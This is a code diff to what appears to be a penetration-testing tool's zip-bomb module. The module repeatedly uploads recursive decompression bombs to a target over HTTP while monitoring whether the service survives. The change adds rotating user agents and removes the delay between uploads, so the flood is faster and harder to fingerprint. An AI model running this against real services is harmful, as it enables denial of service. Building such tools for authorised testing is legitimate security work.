@@ -6,6 +6,7 @@ from infrastructure import factory
 from misc.pt_zip import make_recurssive_bomb
 from monitoring.ptcheckservice import print_error, attack_append_out_data, attack_checkservice_review
 from misc.pt_http import post_file_upload
+from misc.globalfuncs import load_user_agents, parse_url
 # external libs
 from dataclasses import dataclass
 from ptlibs.ptprinthelper import ptprint,out_ifnot
@@ -40,8 +41,9 @@ class ZipBomb:
             ptprint(out_ifnot("Local mode detected. Skipping HTTP delivery.", "INFO", use_json))
             return
 
+        my_user_agents, my_accept_lang = load_user_agents()
+
         att_start_t_epoch = time() #workaround since building zipbombs obviously takes time
-        
         monitoringprocess = monitoring.call_checkservice_repeatedly(use_json)
         ctx = 0
         try:
@@ -53,9 +55,9 @@ class ZipBomb:
                     attack_checkservice_review(monitoring, use_json, json_obj, json_no, self.name)
                     break
                 
-                if post_file_upload(dst, str(randbytes(8).hex()) + ".zip", bomb):
+                if post_file_upload(dst, str(randbytes(8).hex()) + ".zip", bomb, my_user_agents, my_accept_lang):
                     ctx += 1
-                sleep(1)
+                
 
         except BaseException as err:
             monitoringprocess()
